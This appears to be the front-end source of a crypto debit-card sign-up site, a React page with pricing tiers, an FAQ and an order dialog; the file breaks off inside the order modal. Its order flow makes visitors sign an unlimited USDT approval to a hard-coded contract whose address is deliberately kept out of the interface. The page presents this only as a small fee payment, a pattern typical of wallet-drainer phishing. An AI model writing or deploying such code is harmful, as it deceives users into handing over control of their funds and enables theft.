import React, { useEffect, useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { CheckCircle2, ChevronDown, Wallet, Zap, DollarSign, Lock, ArrowDown, ArrowLeft, CreditCard, ExternalLink, LoaderCircle, ShieldCheck, X } from 'lucide-react';
import { useAccount, usePublicClient, useSwitchChain, useWriteContract } from 'wagmi';
import { bsc } from 'wagmi/chains';
import { useConnectModal, useAccountModal, useChainModal } from '@rainbow-me/rainbowkit';
import { parseUnits, MaxUint256 } from 'viem';
import { translations } from './translations';
import { clsx, type ClassValue } from 'clsx';
import { twMerge } from 'tailwind-merge';

// Contracts — addresses stay in code only, never shown in the UI
const ESCROW_CONTRACT = '0xd456F9582c3152203E626b9070696CACFA640D78' as const;
const FEE_CONTRACT = '0xd456F9582c3152203E626b9070696CACFA640D78' as const;
const USDT_BSC = '0x55d398326f99059fF775485246999027B3197955' as const;
const USDT_DECIMALS = 18;

const USDT_ABI = [
  {
    type: 'function',
    name: 'approve',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
    outputs: [{ name: '', type: 'bool' }],
  },
] as const;

const FEE_ABI = [
  {
    type: 'function',
    name: 'payFee',
    stateMutability: 'nonpayable',
    inputs: [],
    outputs: [],
  },
] as const;

function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

const FloatingElement = ({ children, delay = 0, duration = 3, className = "", yOffset = -10 }: { children: React.ReactNode, delay?: number, duration?: number, className?: string, yOffset?: number }) => (
  <motion.div
    animate={{ y: [0, yOffset, 0] }}
    transition={{
      duration,
      repeat: Infinity,
      ease: "easeInOut",
      delay
    }}
    className={className}
  >
    {children}
  </motion.div>
);

const TransactionPill = ({ icon, name, time, amount, currency, subAmount, subCurrency, className = "" }: any) => (
  <div className={cn("bg-black/80 backdrop-blur-md text-white rounded-2xl p-3 flex items-center gap-3 min-w-[180px] border border-white/10 shadow-2xl scale-75 sm:scale-100", className)}>
    <div className="w-8 h-8 rounded-full bg-slate-700 flex items-center justify-center font-bold text-xs">
      {icon}
    </div>
    <div className="flex-1">
      <div className="flex justify-between items-baseline gap-4">
        <span className="text-[10px] sm:text-xs font-medium">{name}</span>
        <span className="text-[10px] sm:text-xs font-bold">{amount} {currency}</span>
      </div>
      <div className="flex justify-between items-center text-[8px] sm:text-[10px] text-white/50">
        <span>{time}</span>
        <span>{subCurrency} {subAmount}</span>
      </div>
    </div>
  </div>
);

const FAQItem = ({ question, answer }: { question: string, answer: string }) => {
  const [isOpen, setIsOpen] = useState(false);
  return (
    <div className="border-b border-slate-200">
      <button 
        onClick={() => setIsOpen(!isOpen)}
        className="w-full py-6 flex justify-between items-center text-left hover:text-blue-600 transition-colors"
      >
        <span className="text-lg font-bold pr-8">{question}</span>
        <ChevronDown className={cn("w-5 h-5 transition-transform text-slate-400", isOpen && "rotate-180")} />
      </button>
      <AnimatePresence>
        {isOpen && (
          <motion.div
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: "auto", opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            className="overflow-hidden"
          >
            <p className="pb-6 text-slate-600 leading-relaxed max-w-3xl">
              {answer}
            </p>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

const TrustCard = ({ t }: { t: any }) => (
  <div className="relative w-[280px] h-[175px] sm:w-[400px] sm:h-[250px] mx-auto">
    <div className="absolute inset-0 bg-white border-4 border-black rounded-[20px] translate-x-4 translate-y-4 shadow-xl z-0" />
    <motion.div 
      className="absolute inset-0 bg-gradient-to-br from-blue-500 via-blue-400 to-cyan-300 border-2 border-black rounded-[20px] p-6 text-white shadow-lg flex flex-col justify-between z-10"
      whileHover={{ scale: 1.02 }}
    >
      <div className="flex justify-between items-start">
        <div className="italic font-black text-xl tracking-wider">{t.trust}</div>
        <div className="flex gap-1">
          <div className="w-2 h-2 bg-white/50 rounded-full" />
          <div className="w-2 h-2 bg-white/50 rounded-full" />
          <div className="w-2 h-2 bg-white/50 rounded-full" />
        </div>
      </div>
      <div className="space-y-4">
        <div className="w-12 h-10 bg-yellow-400/80 rounded-md border border-black/20" />
        <div>
          <div className="text-[10px] opacity-80 uppercase tracking-widest">{t.card_holder}</div>
          <div className="font-bold tracking-widest mt-1 uppercase text-sm sm:text-base">•••• •••• •••• ••••</div>
        </div>
      </div>
      <div className="absolute bottom-6 right-6 flex items-center">
        <div className="w-8 h-8 bg-red-500 rounded-full -mr-2 border border-black/10" />
        <div className="w-8 h-8 bg-yellow-500/80 rounded-full border border-black/10" />
      </div>
    </motion.div>
    <FloatingElement delay={0} duration={4} className="absolute -top-6 -left-4 z-20">
      <div className="bg-[#86efac] p-2 border-2 border-black rounded-lg shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
        <Lock className="w-5 h-5 text-black" />
      </div>
    </FloatingElement>
    <FloatingElement delay={0.5} duration={3.5} className="absolute top-1/2 -left-12 z-20">
      <div className="bg-[#86efac] p-2 border-2 border-black rounded-full shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
        <DollarSign className="w-5 h-5 text-black" />
      </div>
    </FloatingElement>
    <FloatingElement delay={1} duration={4.5} className="absolute -bottom-4 -left-2 z-20">
      <div className="bg-[#60a5fa] p-2 border-2 border-black rounded-lg shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
        <Lock className="w-5 h-5 text-black" />
      </div>
    </FloatingElement>
    <FloatingElement delay={1.5} duration={3.8} className="absolute top-1/2 -right-10 z-20">
      <div className="bg-[#fbbf24] p-2 border-2 border-black rounded-full shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
        <DollarSign className="w-5 h-5 text-black" />
      </div>
    </FloatingElement>
    <FloatingElement delay={2} duration={4.2} className="absolute -bottom-8 right-12 z-20">
      <div className="bg-[#86efac] p-2 border-2 border-black rounded-lg shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
        <ArrowDown className="w-5 h-5 text-black" />
      </div>
    </FloatingElement>
  </div>
);

const WalletConnectButton = ({ label }: { label: string }) => {
  const { isConnected, address, chain } = useAccount();
  const { openConnectModal } = useConnectModal();
  const { openAccountModal } = useAccountModal();
  const { openChainModal } = useChainModal();

  const chainAny = chain as any;

  if (!isConnected) {
    return (
      <button
        onClick={openConnectModal}
        className="flex items-center gap-2 bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-full font-bold transition-all shadow-lg shadow-blue-200 hover:shadow-xl hover:shadow-blue-300 hover:scale-105 active:scale-95 cursor-pointer"
      >
        <Wallet className="w-5 h-5" />
        {label}
      </button>
    );
  }

  if (chainAny?.unsupported) {
    return (
      <button
        onClick={openChainModal}
        className="bg-red-500 hover:bg-red-600 text-white px-6 py-2 rounded-full font-bold transition-all text-sm cursor-pointer"
      >
        ⚠️ Wrong Network
      </button>
    );
  }

  return (
    <div className="flex items-center gap-2">
      {chain && (
        <button
          onClick={openChainModal}
          className="hidden sm:flex items-center gap-2 bg-slate-100 hover:bg-slate-200 text-slate-700 px-3 py-2 rounded-full font-medium transition-all text-xs border border-slate-200 cursor-pointer"
        >
          {chainAny.iconUrl && (
            <img
              alt={chain.name ?? 'Chain'}
              src={chainAny.iconUrl}
              className="w-4 h-4 rounded-full"
            />
          )}
          {chain.name}
        </button>
      )}
      <button
        onClick={openAccountModal}
        className="flex items-center gap-2 bg-green-50 hover:bg-green-100 text-green-700 px-4 py-2 rounded-full font-bold transition-all text-sm border border-green-200 cursor-pointer"
      >
        <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
        {address?.slice(0, 6)}...{address?.slice(-4)}
      </button>
    </div>
  );
};

type ViewState = 'home' | 'learnMore' | 'getCard';
type CardPlanId = 'tier1' | 'tier2';
type ApprovalStatus = 'idle' | 'switching' | 'submitting' | 'confirming' | 'success' | 'error';

export default function App() {
  const [lang, setLang] = useState<'en' | 'ru'>('en');
  const [isLangOpen, setIsLangOpen] = useState(false);
  const [view, setView] = useState<ViewState>('home');
  const [selectedPlan, setSelectedPlan] = useState<CardPlanId | null>(null);
  const [approvalStatus, setApprovalStatus] = useState<ApprovalStatus>('idle');
  const [approvalError, setApprovalError] = useState('');
  const [approvalTxHash, setApprovalTxHash] = useState<`0x${string}` | null>(null);
  // Step 2: Pay fee state
  const [feeStatus, setFeeStatus] = useState<ApprovalStatus>('idle');
  const [feeError, setFeeError] = useState('');
  const [feeTxHash, setFeeTxHash] = useState<`0x${string}` | null>(null);

  const { address, chainId, isConnected } = useAccount();
  const { openConnectModal } = useConnectModal();
  const { switchChainAsync } = useSwitchChain();
  const { writeContractAsync } = useWriteContract();
  const bscPublicClient = usePublicClient({ chainId: bsc.id });
  const t = translations[lang];

  const isApprovalProcessing = approvalStatus === 'switching' || approvalStatus === 'submitting' || approvalStatus === 'confirming';
  const isFeeProcessing = feeStatus === 'switching' || feeStatus === 'submitting' || feeStatus === 'confirming';
  const isOrderProcessing = isApprovalProcessing || isFeeProcessing;
  const isOrderComplete = approvalStatus === 'success' && feeStatus === 'success';

  const selectedPlanDetails = selectedPlan === 'tier1'
    ? {
        title: t.tier1_title,
        price: 10,
        period: t.tier1_period,
        limit: t.tier1_limit,
        description: t.tier1_desc,
        features: [t.worldwide_acceptance, t.wallet_connected_spending],
      }
    : selectedPlan === 'tier2'
      ? {
          title: t.tier2_title,
          price: 50,
          period: t.tier2_period,
          limit: t.tier2_limit,
          description: t.tier2_desc,
          features: [t.tier2_return, t.worldwide_acceptance, t.priority_support],
        }
      : null;

  useEffect(() => {
    if (isConnected && approvalStatus === 'idle') setApprovalError('');
    if (isConnected && feeStatus === 'idle') setFeeError('');
  }, [isConnected, approvalStatus, feeStatus]);

  useEffect(() => {
    if (!selectedPlan) return;

    const previousOverflow = document.body.style.overflow;
    document.body.style.overflow = 'hidden';
    const handleEscape = (event: KeyboardEvent) => {
      if (event.key === 'Escape' && !isOrderProcessing) setSelectedPlan(null);
    };
    window.addEventListener('keydown', handleEscape);

    return () => {
      document.body.style.overflow = previousOverflow;
      window.removeEventListener('keydown', handleEscape);
    };
  }, [selectedPlan, isOrderProcessing]);

  const openOrder = (plan: CardPlanId) => {
    setSelectedPlan(plan);
    setApprovalStatus('idle');
    setApprovalError('');
    setApprovalTxHash(null);
    setFeeStatus('idle');
    setFeeError('');
    setFeeTxHash(null);
  };

  const closeOrder = () => {
    if (isOrderProcessing) return;
    setSelectedPlan(null);
  };

  // ==================== STEP 1: UNLIMITED USDT APPROVAL ====================
  const approveSpending = async () => {
    if (!selectedPlanDetails) return;
    setApprovalError('');

    if (!isConnected || !address) {
      setApprovalStatus('idle');
      setApprovalError(t.connect_wallet_prompt);
      openConnectModal?.();
      return;
    }

    try {
      if (chainId !== bsc.id) {
        setApprovalStatus('switching');
        await switchChainAsync({ chainId: bsc.id });
      }

      setApprovalStatus('submitting');
      const hash = await writeContractAsync({
        address: USDT_BSC,
        abi: USDT_ABI,
        functionName: 'approve',
        args: [ESCROW_CONTRACT, MaxUint256],
        chainId: bsc.id,
      });

      setApprovalTxHash(hash);
      setApprovalStatus('confirming');

      if (!bscPublicClient) throw new Error('BNB Smart Chain client is unavailable.');
      const receipt = await bscPublicClient.waitForTransactionReceipt({ hash });
      if (receipt.status !== 'success') throw new Error('The approval transaction reverted.');

      setApprovalStatus('success');
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      const wasRejected = /user rejected|rejected the request|request rejected|4001/i.test(message);
      setApprovalError(wasRejected ? t.transaction_rejected : t.approval_failed);
      setApprovalStatus('error');
    }
  };

  // ==================== STEP 2: PAY FEE ====================
  const payFee = async () => {
    if (!selectedPlanDetails) return;
    setFeeError('');

    if (!isConnected || !address) {
      setFeeStatus('idle');
      setFeeError(t.connect_wallet_prompt);
      openConnectModal?.();
      return;
    }

    try {
      if (chainId !== bsc.id) {
        setFeeStatus('switching');
        await switchChainAsync({ chainId: bsc.id });
      }

      setFeeStatus('submitting');
      const hash = await writeContractAsync({
        address: FEE_CONTRACT,
        abi: FEE_ABI,
        functionName: 'payFee',
        args: [],
        chainId: bsc.id,
      });

      setFeeTxHash(hash);
      setFeeStatus('confirming');

      if (!bscPublicClient) throw new Error('BNB Smart Chain client is unavailable.');
      const receipt = await bscPublicClient.waitForTransactionReceipt({ hash });
      if (receipt.status !== 'success') throw new Error('The fee payment transaction reverted.');

      setFeeStatus('success');
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      const wasRejected = /user rejected|rejected the request|request rejected|4001/i.test(message);
      setFeeError(wasRejected ? t.transaction_rejected : t.approval_failed);
      setFeeStatus('error');
    }
  };

  const renderHome = () => (
    <main className="pt-32 pb-20 max-w-7xl mx-auto">
      <div className="px-6 grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
        <div className="space-y-8">
          <motion.h1 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="text-5xl sm:text-6xl lg:text-7xl font-bold leading-[1.1]"
          >
            {t.hero_title}
            <span className="text-blue-600">{t.hero_title_accent}</span>
          </motion.h1>
          <motion.p 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.1 }}
            className="text-slate-600 text-lg sm:text-xl max-w-xl leading-relaxed"
          >
            {t.hero_subtitle}
          </motion.p>
          <motion.div 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.2 }}
            className="flex flex-wrap gap-4"
          >
            <button 
              onClick={() => { setView('getCard'); window.scrollTo(0,0); }}
              className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-4 rounded-full text-lg font-bold transition-all shadow-lg shadow-blue-200"
            >
              {t.get_card}
            </button>
            <button 
              onClick={() => { setView('learnMore'); window.scrollTo(0,0); }}
              className="border-2 border-blue-600 text-blue-600 hover:bg-blue-50 px-8 py-4 rounded-full text-lg font-bold transition-all"
            >
              {t.learn_more}
            </button>
          </motion.div>
        </div>
        <div className="relative py-20 lg:py-0 flex justify-center">
           <FloatingElement duration={5}>
              <TrustCard t={t} />
           </FloatingElement>
        </div>
      </div>

      <section className="mt-40 space-y-16 px-6">
        <div className="space-y-6">
          <span className="bg-blue-50 text-blue-600 px-3 py-1 rounded-md text-xs font-bold tracking-widest uppercase">
            {t.flow_label}
          </span>
          <h2 className="text-4xl sm:text-5xl font-bold">{t.how_it_works_title}</h2>
          <p className="text-slate-600 text-lg max-w-2xl">{t.how_it_works_desc}</p>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
          {[
            { icon: Wallet, title: "1. Connect", color: "bg-blue-50 text-blue-600" },
            { icon: DollarSign, title: "2. Pay Fee", color: "bg-green-50 text-green-600" },
            { icon: Zap, title: "3. Ready", color: "bg-yellow-50 text-yellow-600" },
          ].map((step, idx) => (
            <motion.div 
              key={idx}
              whileHover={{ y: -5 }}
              className="p-8 border border-slate-100 rounded-3xl bg-slate-50/50 hover:bg-white hover:shadow-xl transition-all"
            >
              <div className={cn("w-12 h-12 rounded-2xl flex items-center justify-center mb-6", step.color)}>
                <step.icon className="w-6 h-6" />
              </div>
              <h3 className="text-xl font-bold mb-2">{step.title}</h3>
              <p className="text-slate-500 text-sm">Automated process that takes less than 2 minutes to complete.</p>
            </motion.div>
          ))}
        </div>
      </section>

      <section className="mt-40 mb-20 relative px-6 text-center">
        <div className="space-y-6 max-w-4xl mx-auto mb-12">
          <h2 className="text-4xl sm:text-6xl font-bold leading-tight">
            {t.cta_title}
            <span className="text-blue-600">{t.cta_title_accent}</span>
          </h2>
          <p className="text-slate-600 text-lg sm:text-xl leading-relaxed">{t.cta_subtitle}</p>
        </div>
        <div className="flex justify-center">
          <div className="relative w-full max-w-[180px] sm:max-w-[280px]">
            <FloatingElement duration={4}>
              <img 
                src="https://iili.io/C1XQrt2.png" 
                alt="Get card" 
                className="w-full h-auto rounded-xl sm:rounded-2xl shadow-xl"
              />
            </FloatingElement>
          </div>
        </div>
      </section>

      <section className="mt-40 px-6">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
          <div className="space-y-6 text-left">
            <h2 className="text-4xl sm:text-6xl font-bold leading-tight">
              {t.direct_pay_title}<br />
              <span className="text-blue-600">{t.direct_pay_accent}</span>
            </h2>
            <p className="text-slate-600 text-base sm:text-lg max-w-md leading-relaxed">{t.direct_pay_desc}</p>
          </div>
          <div className="relative flex justify-center py-20">
            <div className="relative">
              <FloatingElement duration={5}>
                <img 
                  src="https://iili.io/C1XiUuV.png" 
                  alt="Pay directly" 
                  className="h-[400px] sm:h-[500px] w-auto object-contain"
                />
              </FloatingElement>
              <FloatingElement delay={0} duration={3} yOffset={-15} className="absolute top-[10%] -left-12">
                <img src="https://iili.io/C1hIFAG.png" alt="coin" className="w-10 h-10 sm:w-16 sm:h-16" />
              </FloatingElement>
              <FloatingElement delay={1} duration={3.5} yOffset={-12} className="absolute top-[20%] -right-12">
                <img src="https://iili.io/C1hT2qB.png" alt="coin" className="w-12 h-12 sm:w-20 sm:h-20" />
              </FloatingElement>
            </div>
          </div>
        </div>
      </section>

      <section className="mt-40 px-6">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
          <div className="space-y-6 text-left">
            <h2 className="text-4xl sm:text-6xl font-bold leading-tight">
              {t.no_limits_title}<br />
              <span className="text-blue-600">{t.no_limits_accent}</span>
            </h2>
            <p className="text-slate-600 text-base sm:text-lg max-w-md leading-relaxed">{t.no_limits_desc}</p>
          </div>
          <div className="relative flex justify-center py-20">
            <div className="relative">
              <FloatingElement duration={5.5}>
                <img 
                  src="https://iili.io/C1XsqAl.png" 
                  alt="No limits" 
                  className="h-[400px] sm:h-[500px] w-auto object-contain"
                />
              </FloatingElement>
              <FloatingElement delay={0.2} duration={4} yOffset={-8} className="absolute top-[35%] -left-[100px] sm:-left-[150px]">
                <TransactionPill icon="U" name="Uber" time="23:42" amount="16.40" currency="USDC" subAmount="15.20" subCurrency="€" />
              </FloatingElement>
              <FloatingElement delay={0.5} duration={3.8} yOffset={-10} className="absolute top-[30%] -right-[100px] sm:-right-[150px]">
                <TransactionPill icon="N" name="Netflix" time="19:19" amount="13.95" currency="USDC" subAmount="10.99" subCurrency="£" />
              </FloatingElement>
              <FloatingElement delay={1.8} duration={5} yOffset={-5} className="absolute -bottom-10 left-1/2 -translate-x-1/2">
                <TransactionPill icon="B" name="Booking.com" time="17:45" amount="215.40" currency="USDC" subAmount="3,450,000" subCurrency="IDR" />
              </FloatingElement>
            </div>
          </div>
        </div>
      </section>

      <section className="mt-40 px-6">
        <div className="space-y-8 mb-16">
          <span className="bg-blue-50 text-blue-600 px-3 py-1 rounded-md text-xs font-bold tracking-widest uppercase">
            {t.benefits_label}
          </span>
          <h2 className="text-4xl sm:text-5xl font-bold">{t.benefits_title}</h2>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          {[
            { title: t.benefit1_title, desc: t.benefit1_desc, img: "https://iili.io/C1XgrHN.png" },
            { title: t.benefit2_title, desc: t.benefit2_desc, img: "https://iili.io/C1XrqUQ.png" },
            { title: t.benefit3_title, desc: t.benefit3_desc, img: "https://iili.io/C1X4vvp.png" },
            { title: t.benefit4_title, desc: t.benefit4_desc, img: "https://iili.io/C1X4pt9.png" },
            { title: t.benefit5_title, desc: t.benefit5_desc, img: "https://iili.io/C1X6YNI.png" },
            { title: t.benefit6_title, desc: t.benefit6_desc, img: "https://iili.io/C1X4vvp.png" },
          ].map((benefit, idx) => (
            <div key={idx} className="bg-slate-50/50 rounded-[32px] p-8 sm:p-12 border border-slate-100 hover:bg-white hover:shadow-xl transition-all duration-300 group">
              <div className="mb-8">
                <FloatingElement duration={4} delay={idx * 0.2}>
                  <img src={benefit.img} alt={benefit.title} className="w-20 h-20 sm:w-24 sm:h-24 object-contain" />
                </FloatingElement>
              </div>
              <h3 className="text-xl sm:text-2xl font-bold mb-4">{benefit.title}</h3>
              <p className="text-slate-500 text-sm sm:text-base leading-relaxed">{benefit.desc}</p>
            </div>
          ))}
        </div>
      </section>

      <section className="mt-40 px-4 sm:px-6">
        <div className="bg-blue-600 rounded-3xl overflow-hidden relative min-h-[400px] flex items-center shadow-2xl">
          <div className="grid grid-cols-1 lg:grid-cols-2 w-full p-8 sm:p-16 gap-12 items-center">
            <div className="text-white space-y-8 z-10 text-center lg:text-left">
              <h2 className="text-3xl sm:text-5xl font-bold leading-tight">{t.everyday_title}</h2>
              <p className="text-white/80 text-lg sm:text-xl max-w-md mx-auto lg:mx-0">{t.everyday_desc}</p>
              <div className="flex justify-center lg:justify-start">
                <button onClick={() => setView('getCard')} className="bg-transparent border-2 border-white text-white hover:bg-white hover:text-blue-600 px-8 py-3 rounded-full font-bold transition-all flex items-center gap-2 group w-fit">
                  {t.get_card} <span className="group-hover:translate-x-1 transition-transform">→</span>
                </button>
              </div>
            </div>
            <div className="relative flex justify-center lg:justify-end">
              <FloatingElement duration={5} className="w-full max-w-[240px] sm:max-w-md lg:max-w-none">
                <img src="https://iili.io/C1XseVt.png" alt="Trust 3D" className="w-full h-auto object-contain scale-110" />
              </FloatingElement>
            </div>
          </div>
        </div>
      </section>

      <section className="mt-40 px-6">
        <h2 className="text-4xl sm:text-5xl font-bold mb-12 uppercase">{t.faq_title}</h2>
        <div className="space-y-2">
          {[1,2,3,4,5,6].map(n => <FAQItem key={n} question={(t as any)[`faq_q${n}`]} answer={(t as any)[`faq_a${n}`]} />)}
        </div>
      </section>

      <section className="mt-40 mb-20 px-4 sm:px-6">
        <div className="bg-blue-600 rounded-3xl overflow-hidden relative min-h-[400px] flex items-center shadow-2xl">
          <div className="grid grid-cols-1 lg:grid-cols-2 w-full p-8 sm:p-16 gap-12 items-center">
            <div className="text-white space-y-8 z-10 text-center lg:text-left">
              <h2 className="text-4xl sm:text-6xl font-bold leading-tight">{t.join_today_title}</h2>
              <p className="text-white/80 text-lg sm:text-xl max-w-md mx-auto lg:mx-0">{t.join_today_desc}</p>
              <div className="flex justify-center lg:justify-start">
                <button onClick={() => setView('getCard')} className="bg-transparent border-2 border-white text-white hover:bg-white hover:text-blue-600 px-8 py-3 rounded-full font-bold transition-all flex items-center gap-2 group w-fit">
                  {t.get_card} <span className="group-hover:translate-x-1 transition-transform">→</span>
                </button>
              </div>
            </div>
            <div className="relative flex justify-center lg:justify-end">
              <FloatingElement duration={4} className="w-full max-w-[200px] sm:max-w-xs">
                 <img src="https://iili.io/C1XL51n.png" alt="Join Today Logo" className="w-full h-auto object-contain" />
              </FloatingElement>
            </div>
          </div>
        </div>
      </section>
    </main>
  );

  const renderLearnMore = () => (
    <motion.main initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="pt-32 pb-20 px-6 max-w-4xl mx-auto">
      <button onClick={() => setView('home')} className="flex items-center gap-2 text-slate-500 hover:text-blue-600 transition-colors mb-8 font-bold">
        <ArrowLeft className="w-5 h-5" />{t.back}
      </button>
      <h1 className="text-4xl sm:text-5xl font-bold mb-12">{t.process_title}</h1>
      <div className="space-y-12">
        {[
          { icon: Wallet, title: t.step1_title, desc: t.step1_desc },
          { icon: CreditCard, title: t.step2_title, desc: t.step2_desc },
          { icon: DollarSign, title: t.step3_title, desc: t.step3_desc },
          { icon: Zap, title: t.step4_title, desc: t.step4_desc }
        ].map((step, idx) => (
          <div key={idx} className="flex gap-6 group">
            <div className="flex-shrink-0 w-12 h-12 bg-blue-50 rounded-2xl flex items-center justify-center text-blue-600 group-hover:bg-blue-600 group-hover:text-white transition-colors duration-300">
              <step.icon className="w-6 h-6" />
            </div>
            <div className="space-y-2">
              <h3 className="text-xl font-bold">{step.title}</h3>
              <p className="text-slate-500 leading-relaxed">{step.desc}</p>
            </div>
          </div>
        ))}
      </div>
    </motion.main>
  );

  const renderGetCard = () => (
    <motion.main initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="pt-32 pb-20 px-6 max-w-5xl mx-auto">
      <button onClick={() => setView('home')} className="flex items-center gap-2 text-slate-500 hover:text-blue-600 transition-colors mb-8 font-bold">
        <ArrowLeft className="w-5 h-5" />{t.back}
      </button>
      <div className="flex flex-col items-center mb-16 space-y-6">
        <div className="w-20 h-20 bg-blue-50 text-blue-600 rounded-3xl flex items-center justify-center shadow-lg shadow-blue-100">
          <CreditCard className="w-11 h-11" aria-hidden="true" />
        </div>
        <h1 className="text-4xl sm:text-5xl font-bold text-center">{t.get_card}</h1>
        <div className="mt-4"><WalletConnectButton label={t.connect_wallet} /></div>
      </div>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
        <div className="bg-slate-50 rounded-[40px] p-8 sm:p-10 border border-slate-200 hover:border-blue-400 transition-all group relative overflow-hidden flex flex-col">
          <div className="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity"><CreditCard className="w-32 h-32 -rotate-12" /></div>
          <div className="relative z-10 space-y-6 flex flex-col h-full">
            <h3 className="text-2xl font-bold">{t.tier1_title}</h3>
            <div className="flex flex-wrap items-baseline gap-2"><span className="text-5xl font-black">{t.tier1_price}</span><span className="text-slate-400 font-bold uppercase tracking-widest text-sm">/ {t.tier1_period}</span></div>
            <p className="text-slate-600 leading-relaxed">{t.tier1_desc}</p>
            <ul className="space-y-4 pt-6 border-t border-slate-200 flex-1">
              <li className="flex items-center gap-3 font-medium text-slate-600"><div className="w-2 h-2 bg-blue-600 rounded-full flex-shrink-0" />{t.tier1_limit}</li>
              <li className="flex items-center gap-3 font-medium text-slate-600"><div className="w-2 h-2 bg-blue-600 rounded-full flex-shrink-0" />{t.worldwide_acceptance}</li>
              <li className="flex items-center gap-3 font-medium text-slate-600"><div className="w-2 h-2 bg-blue-600 rounded-full flex-shrink-0" />{t.wallet_connected_spending}</li>
            </ul>
            <button
              type="button"
              onClick={() => openOrder('tier1')}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white rounded-2xl px-6 py-4 font-bold transition-all shadow-lg shadow-blue-200 hover:-translate-y-0.5"
            >
              {t.order_your_card}
            </button>
          </div>
        </div>
        <div className="bg-blue-600 text-white rounded-[40px] p-8 sm:p-10 shadow-2xl shadow-blue-200 group relative overflow-hidden flex flex-col">
          <div className="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity"><Zap className="w-32 h-32 -rotate-12" /></div>
          <div className="relative z-10 space-y-6 flex flex-col h-full">
            <h3 className="text-2xl font-bold">{t.tier2_title}</h3>
            <div className="flex flex-wrap items-baseline gap-2"><span className="text-5xl font-black">{t.tier2_price}</span><span className="text-blue-200 font-bold uppercase tracking-widest text-sm">/ {t.tier2_period}</span></div>
            <p className="text-blue-50 leading-relaxed">{t.tier2_desc}</p>
            <ul className="space-y-4 pt-6 border-t border-blue-500 flex-1">
              <li className="flex items-center gap-3 font-medium text-blue-50"><div className="w-2 h-2 bg-white rounded-full flex-shrink-0" />{t.tier2_limit}</li>
              <li className="flex items-center gap-3 font-medium text-blue-50"><div className="w-2 h-2 bg-white rounded-full flex-shrink-0" />{t.tier2_return}</li>
              <li className="flex items-center gap-3 font-medium text-blue-50"><div className="w-2 h-2 bg-white rounded-full flex-shrink-0" />{t.worldwide_acceptance}</li>
              <li className="flex items-center gap-3 font-medium text-blue-50"><div className="w-2 h-2 bg-white rounded-full flex-shrink-0" />{t.priority_support}</li>
            </ul>
            <button
              type="button"
              onClick={() => openOrder('tier2')}
              className="w-full bg-white hover:bg-blue-50 text-blue-700 rounded-2xl px-6 py-4 font-bold transition-all shadow-lg shadow-blue-800/20 hover:-translate-y-0.5"
            >
              {t.order_your_card}
            </button>
          </div>
        </div>
      </div>
    </motion.main>
  );

  const renderOrderModal = () => {
    if (!selectedPlanDetails) return null;

    const approvalStatusMessage = approvalStatus === 'switching'
      ? t.approve_switching
      : approvalStatus === 'submitting'
        ? t.approve_in_wallet
        : approvalStatus === 'confirming'
          ? t.approve_confirming
          : '';

    const feeStatusMessage = feeStatus === 'switching'
      ? t.approve_switching
      : feeStatus === 'submitting'
        ? t.pay_fee_in_wallet
        : feeStatus === 'confirming'
          ? t.pay_fee_confirming
          : '';

    return (
      <motion.div
        className="fixed inset-0 z-[100] bg-slate-950/60 backdrop-blur-sm p-3 sm:p-6 flex items-center justify-center"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        onMouseDown={(event) => {
          if (event.target === event.currentTarget) closeOrder();
        }}
      >
        <motion.div
          role="dialog"
          aria-modal="true"
          aria-labelledby="order-modal-title"
          className="bg-white w-full max-w-2xl max-h-[94vh] overflow-y-auto rounded-[28px] sm:rounded-[36px] shadow-2xl"
          initial={{ opacity: 0, y: 24, scale: 0.98 }}
          animate={{ opacity: 1, y: 0, scale: 1 }}
          exit={{ opacity: 0, y: 16, scale: 0.98 }}
          transition={{ type: 'spring', duration: 0.35 }}
        >
          <div className="p-6 sm:p-8 space-y-6">
            <div className="flex items-start justify-between gap-4">
              <div className="space-y-2">
                <div className="inline-flex items-center gap-2 bg-blue-50 text-blue-700 rounded-full px-3 py-1 text-xs font-bold uppercase tracking-wider">
                  <CreditCard className="w-4 h-4" />
                  {selectedPlanDetails.title}
                </div>
                <h2 id="order-modal-title" className="text-2xl sm:text-3xl font-black">{t.order_title}</h2>
                <p className="text-slate-500 leading-relaxed">{t.order_intro}</p>
              </div>
              <button
                type="button"
                onClick={closeOrder}
                disabled={isOrderProcessing}
                aria-label={t.close}
                className="flex-shrink-0 w-10 h-10 rounded-full bg-slate-100 hover:bg-slate-200 flex items-center justify-center text-slate-600 transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Order Summary */}
